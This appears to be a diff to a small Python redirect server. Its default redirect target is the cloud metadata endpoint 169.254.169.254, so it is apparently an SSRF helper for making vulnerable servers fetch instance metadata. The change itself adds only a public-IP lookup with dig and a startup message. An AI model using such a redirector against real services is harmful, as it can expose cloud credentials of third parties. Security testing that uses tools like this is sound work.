@@ -5,6 +5,7 @@
 #
 import argparse
 import sys
+import os
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url", required=False ,default="http://169.254.169.254/latest/meta-data/",help="url to redirect to")
@@ -48,6 +49,9 @@ class Redirect(BaseHTTPRequestHandler):
        self.end_headers()
     
 try:
+	ip = os.popen("dig +short myip.opendns.com @resolver1.opendns.com").read()
+	ip = ip.replace("\n","")
+	print("[+] Server Started on http://"+ip+":"+str(port)+" [+]")
 	HTTPServer(("", port), Redirect).serve_forever()
 except KeyboardInterrupt:
 		print ("Ctrl-c pressed ...")
